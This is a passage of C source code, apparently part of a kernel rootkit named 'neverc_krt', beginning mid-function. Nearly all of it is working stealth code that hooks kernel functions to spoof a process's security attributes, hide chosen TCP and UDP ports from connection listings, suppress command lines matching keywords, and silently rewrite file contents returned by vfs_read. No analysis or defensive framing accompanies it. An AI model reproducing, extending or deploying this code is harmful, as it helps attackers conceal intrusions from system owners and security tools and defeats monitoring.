	if (_neverc_krt_proc_attr_hooked) return 0;
	if (!fake_context) return -1;

	_neverc_krt_attr_fake_ctx = fake_context;

	target = NEVERC_KRT_LOOKUP("proc_pid_attr_read");
	if (!target) return -1;

	int ret = neverc_krt_hook_install(&_neverc_krt_proc_attr_hook, target,
				   (void *)_neverc_krt_proc_attr_read_filter,
				   (void **)&_neverc_krt_orig_proc_attr_read);
	if (ret) return ret;

	_neverc_krt_proc_attr_hooked = 1;
	return 0;
}

void neverc_krt_proc_attr_filter_cleanup(void)
{
	if (!_neverc_krt_proc_attr_hooked) return;
	neverc_krt_hook_remove(&_neverc_krt_proc_attr_hook);
	_neverc_krt_proc_attr_hooked = 0;
}

int neverc_krt_net_hide_add_port(u16 port)
{
	if (_neverc_krt_net_hide.count >= NEVERC_KRT_NET_HIDE_PORT_MAX)
		return -1;
	_neverc_krt_net_hide.ports[_neverc_krt_net_hide.count++] = port;
	return 0;
}

static int _neverc_krt_net_port_hidden(u16 port)
{
	int i;
	for (i = 0; i < _neverc_krt_net_hide.count; i++) {
		if (_neverc_krt_net_hide.ports[i] == port)
			return 1;
	}
	return 0;
}

static int _neverc_krt_extract_ports(void *sk, u16 *sport, u16 *dport)
{
	if (!sk) return -1;
	const unsigned char *p = (const unsigned char *)sk;
	u16 dp_be, sp_host;

	if (neverc_krt_mem_read(&dp_be, p + _NEVERC_KRT_SKC_DPORT_OFF, 2))
		return -1;
	if (neverc_krt_mem_read(&sp_host, p + _NEVERC_KRT_SKC_NUM_OFF, 2))
		return -1;

	*dport = ((dp_be >> 8) & 0xFF) | ((dp_be & 0xFF) << 8);
	*sport = sp_host;
	return 0;
}

static int _neverc_krt_net_filter_show(void *seq, void *v,
				       neverc_krt_net_seq_show_fn orig)
{
	if (!orig) return 0;

	if (v && (unsigned long)v > 1 &&
	    (unsigned long)v > 0xFFFF000000000000UL) {
		u16 sp = 0, dp = 0;
		if (_neverc_krt_extract_ports(v, &sp, &dp) == 0) {
			if (_neverc_krt_net_port_hidden(sp) ||
			    _neverc_krt_net_port_hidden(dp))
				return 0;
		}
	}
	return orig(seq, v);
}

static int _neverc_krt_tcp4_show_filter(void *seq, void *v)
{ return _neverc_krt_net_filter_show(seq, v, _neverc_krt_orig_tcp4_show); }

static int _neverc_krt_tcp6_show_filter(void *seq, void *v)
{ return _neverc_krt_net_filter_show(seq, v, _neverc_krt_orig_tcp6_show); }

static int _neverc_krt_udp4_show_filter(void *seq, void *v)
{ return _neverc_krt_net_filter_show(seq, v, _neverc_krt_orig_udp4_show); }

static int _neverc_krt_udp6_show_filter(void *seq, void *v)
{ return _neverc_krt_net_filter_show(seq, v, _neverc_krt_orig_udp6_show); }

int neverc_krt_net_hide_install(void)
{
	void *target;

	if (_neverc_krt_net_hide.active) return 0;

	target = NEVERC_KRT_LOOKUP("tcp4_seq_show");
	if (target)
		neverc_krt_hook_install(&_neverc_krt_net_hide.tcp4_hook, target,
				 (void *)_neverc_krt_tcp4_show_filter,
				 (void **)&_neverc_krt_orig_tcp4_show);

	target = NEVERC_KRT_LOOKUP("tcp6_seq_show");
	if (target)
		neverc_krt_hook_install(&_neverc_krt_net_hide.tcp6_hook, target,
				 (void *)_neverc_krt_tcp6_show_filter,
				 (void **)&_neverc_krt_orig_tcp6_show);

	target = NEVERC_KRT_LOOKUP("udp4_seq_show");
	if (target)
		neverc_krt_hook_install(&_neverc_krt_net_hide.udp4_hook, target,
				 (void *)_neverc_krt_udp4_show_filter,
				 (void **)&_neverc_krt_orig_udp4_show);

	target = NEVERC_KRT_LOOKUP("udp6_seq_show");
	if (target)
		neverc_krt_hook_install(&_neverc_krt_net_hide.udp6_hook, target,
				 (void *)_neverc_krt_udp6_show_filter,
				 (void **)&_neverc_krt_orig_udp6_show);

	_neverc_krt_net_hide.active = 1;
	return 0;
}

void neverc_krt_net_hide_cleanup(void)
{
	if (!_neverc_krt_net_hide.active) return;
	if (_neverc_krt_net_hide.udp6_hook.active)
		neverc_krt_hook_remove(&_neverc_krt_net_hide.udp6_hook);
	if (_neverc_krt_net_hide.udp4_hook.active)
		neverc_krt_hook_remove(&_neverc_krt_net_hide.udp4_hook);
	if (_neverc_krt_net_hide.tcp6_hook.active)
		neverc_krt_hook_remove(&_neverc_krt_net_hide.tcp6_hook);
	if (_neverc_krt_net_hide.tcp4_hook.active)
		neverc_krt_hook_remove(&_neverc_krt_net_hide.tcp4_hook);
	_neverc_krt_net_hide.active = 0;
	_neverc_krt_net_hide.count = 0;
}

int neverc_krt_cmdline_filter_add(const char *keyword)
{
	if (_neverc_krt_cmdline_filter_cnt >= NEVERC_KRT_CMDLINE_FILTER_MAX)
		return -1;
	int idx = _neverc_krt_cmdline_filter_cnt;
	const char *s = keyword;
	int i = 0;
	while (*s && i < NEVERC_KRT_CMDLINE_FILTER_LEN - 1)
		_neverc_krt_cmdline_filters[idx][i++] = *s++;
	_neverc_krt_cmdline_filters[idx][i] = '\0';
	_neverc_krt_cmdline_filter_cnt++;
	return 0;
}

static long _neverc_krt_cmdline_read_filter(void *file, char __user *buf,
					    size_t count, long long *ppos)
{
	long ret;
	if (!_neverc_krt_orig_cmdline_read) return -1;

	ret = _neverc_krt_orig_cmdline_read(file, buf, count, ppos);
	if (ret <= 0 || !_neverc_krt_cmdline_filter_cnt)
		return ret;

	if (_neverc_krt_copy_from_user && ret < 256) {
		char tmp[256];
		unsigned long missed =
			_neverc_krt_copy_from_user(tmp, buf, (unsigned long)ret);
		if (!missed) {
			tmp[ret < 255 ? ret : 255] = '\0';
			int k;
			for (k = 0; k < _neverc_krt_cmdline_filter_cnt; k++) {
				if (_neverc_krt_str_contains(tmp,
						      _neverc_krt_cmdline_filters[k]))
					return 0;
			}
		}
	}
	return ret;
}

int neverc_krt_cmdline_filter_install(void)
{
	void *target;

	if (_neverc_krt_cmdline_hooked) return 0;

	target = NEVERC_KRT_LOOKUP("proc_pid_cmdline_read");
	if (!target) return -1;

	int ret = neverc_krt_hook_install(&_neverc_krt_cmdline_hook, target,
				   (void *)_neverc_krt_cmdline_read_filter,
				   (void **)&_neverc_krt_orig_cmdline_read);
	if (ret) return ret;

	_neverc_krt_cmdline_hooked = 1;
	return 0;
}

void neverc_krt_cmdline_filter_cleanup(void)
{
	if (!_neverc_krt_cmdline_hooked) return;
	neverc_krt_hook_remove(&_neverc_krt_cmdline_hook);
	_neverc_krt_cmdline_hooked = 0;
	_neverc_krt_cmdline_filter_cnt = 0;
}

int neverc_krt_file_spoof_add(const char *path,
			      const char *search, int slen,
			      const char *replace, int rlen)
{
	if (_neverc_krt_file_spoof_cnt >= NEVERC_KRT_FILE_SPOOF_MAX)
		return -1;

	struct neverc_krt_file_spoof_entry *e =
		&_neverc_krt_file_spoofs[_neverc_krt_file_spoof_cnt];

	int i = 0;
	while (path[i] && i < NEVERC_KRT_FILE_PATH_MAX - 1) {
		e->path[i] = path[i]; i++;
	}
	e->path[i] = '\0';

	if (slen > NEVERC_KRT_FILE_SPOOF_MAX_LEN) slen = NEVERC_KRT_FILE_SPOOF_MAX_LEN;
	if (rlen > NEVERC_KRT_FILE_SPOOF_MAX_LEN) rlen = NEVERC_KRT_FILE_SPOOF_MAX_LEN;

	for (i = 0; i < slen; i++) e->search[i] = search[i];
	e->search_len = slen;
	for (i = 0; i < rlen; i++) e->replace[i] = replace[i];
	e->replace_len = rlen;

	_neverc_krt_file_spoof_cnt++;
	return 0;
}

static int _neverc_krt_try_dentry_at(unsigned long file_addr, unsigned long off,
				     unsigned long *out_dentry)
{
	unsigned long dentry = 0, name_ptr = 0;
	if (neverc_krt_mem_read(&dentry, (void *)(file_addr + off), 8))
		return 0;
	dentry &= ~(0xFFUL << 56);
	if (dentry < 0xFFFF000000000000UL ||
	    dentry >= 0xFFFFFFFFFFFFF000UL)
		return 0;
	if (neverc_krt_mem_read(&name_ptr,
			 (void *)(dentry + _NEVERC_KRT_DENTRY_DNAME_NAME_OFF),
			 8))
		return 0;
	name_ptr &= ~(0xFFUL << 56);
	if (name_ptr < 0xFFFF000000000000UL)
		return 0;
	unsigned char ch;
	if (neverc_krt_mem_read(&ch, (void *)name_ptr, 1))
		return 0;
	if (ch < 0x20 || ch > 0x7E)
		return 0;
	*out_dentry = dentry;
	return 1;
}

static int _neverc_krt_probe_file_dentry_off(void *file)
{
	unsigned long addr = (unsigned long)file;
	unsigned long dentry;
	unsigned long off;

	unsigned long hint = _neverc_krt_get_file_dentry_off();
	if (_neverc_krt_try_dentry_at(addr, hint, &dentry)) {
		__atomic_store_n(&_neverc_krt_file_dentry_off, hint,
				 __ATOMIC_RELEASE);
		return 0;
	}

	static const unsigned long candidates[] = {
		0x18, 0x48, 0xA0, 0x98, 0x50, 0x40, 0x58, 0x60,
		0x68, 0x70, 0x78, 0x80, 0x88, 0x90, 0xA8, 0xB0
	};
	int i;
	for (i = 0; i < (int)(sizeof(candidates)/sizeof(candidates[0])); i++) {
		off = candidates[i];
		if (off == hint)
			continue;
		if (_neverc_krt_try_dentry_at(addr, off, &dentry)) {
			__atomic_store_n(&_neverc_krt_file_dentry_off, off,
					 __ATOMIC_RELEASE);
			return 0;
		}
	}

	__atomic_store_n(&_neverc_krt_file_dentry_off, hint,
			 __ATOMIC_RELEASE);
	return -1;
}

static int _neverc_krt_file_match_path(void *file, const char *target)
{
	unsigned long dentry = 0, name_ptr = 0;

	if (!__atomic_load_n(&_neverc_krt_file_dentry_probed,
			     __ATOMIC_ACQUIRE) && file) {
		if (!__atomic_exchange_n(&_neverc_krt_file_dentry_probed, 1,
					__ATOMIC_ACQ_REL))
			_neverc_krt_probe_file_dentry_off(file);
	}

	unsigned long off = _neverc_krt_get_file_dentry_off();

	if (neverc_krt_mem_read(&dentry,
			 (void *)((unsigned long)file + off), 8))
		return 0;
	dentry &= ~(0xFFUL << 56);
	if (dentry < 0xFFFF000000000000UL ||
	    dentry >= 0xFFFFFFFFFFFFF000UL)
		return 0;

	if (neverc_krt_mem_read(&name_ptr,
			 (void *)(dentry + _NEVERC_KRT_DENTRY_DNAME_NAME_OFF), 8))
		return 0;
	name_ptr &= ~(0xFFUL << 56);
	if (name_ptr < 0xFFFF000000000000UL) return 0;

	int tlen = 0;
	while (target[tlen]) tlen++;
	if (tlen >= 256) return 0;

	char buf[256];
	if (neverc_krt_mem_read(buf, (void *)name_ptr, tlen + 1))
		return 0;

	int i;
	for (i = 0; i < tlen; i++) {
		if (buf[i] != target[i])
			return 0;
	}
	return buf[tlen] == '\0';
}

static long _neverc_krt_vfs_read_filter(void *file, char __user *buf,
					size_t count, long long *pos)
{
	long ret;
	if (!_neverc_krt_orig_vfs_read) return -1;

	if (!__atomic_load_n(&_neverc_krt_file_dentry_probed,
			     __ATOMIC_ACQUIRE) && file) {
		if (!__atomic_exchange_n(&_neverc_krt_file_dentry_probed, 1,
					__ATOMIC_ACQ_REL))
			_neverc_krt_probe_file_dentry_off(file);
	}

	ret = _neverc_krt_orig_vfs_read(file, buf, count, pos);
	if (ret <= 0 || !_neverc_krt_file_spoof_cnt || !_neverc_krt_copy_from_user ||
	    !_neverc_krt_copy_to_user)
		return ret;

	int k;
	for (k = 0; k < _neverc_krt_file_spoof_cnt; k++) {
		struct neverc_krt_file_spoof_entry *e = &_neverc_krt_file_spoofs[k];
		if (!_neverc_krt_file_match_path(file, e->path))
			continue;

		if (ret > 512 || e->search_len <= 0) continue;

		char tmp[512];
		unsigned long missed =
			_neverc_krt_copy_from_user(tmp, buf, (unsigned long)ret);
		if (missed) continue;

		int j;
		for (j = 0; j <= (int)ret - e->search_len; j++) {
			int m = 1;
			int q;
			for (q = 0; q < e->search_len; q++) {
				if (tmp[j + q] != e->search[q]) {
					m = 0; break;
				}
			}
			if (m && e->replace_len <= e->search_len) {
				for (q = 0; q < e->replace_len; q++)
					tmp[j + q] = e->replace[q];
				for (q = e->replace_len;
				     q < e->search_len; q++)
					tmp[j + q] = ' ';
				_neverc_krt_copy_to_user(buf, tmp,
						  (unsigned long)ret);
				break;
			}
		}
	}
	return ret;
}

int neverc_krt_file_spoof_install(void)
{
	void *target;

	if (_neverc_krt_vfs_read_hooked) return 0;

	target = NEVERC_KRT_LOOKUP("vfs_read");
	if (!target) return -1;

	int ret = neverc_krt_hook_install(&_neverc_krt_vfs_read_hook, target,
				   (void *)_neverc_krt_vfs_read_filter,
				   (void **)&_neverc_krt_orig_vfs_read);
	if (ret) return ret;

	_neverc_krt_vfs_read_hooked = 1;
	return 0;
}

void neverc_krt_file_spoof_cleanup(void)
{
	if (!_neverc_krt_vfs_read_hooked) return;
	neverc_krt_hook_remove(&_neverc_krt_vfs_read_hook);
	_neverc_krt_vfs_read_hooked = 0;
	_neverc_krt_file_spoof_cnt = 0;
}

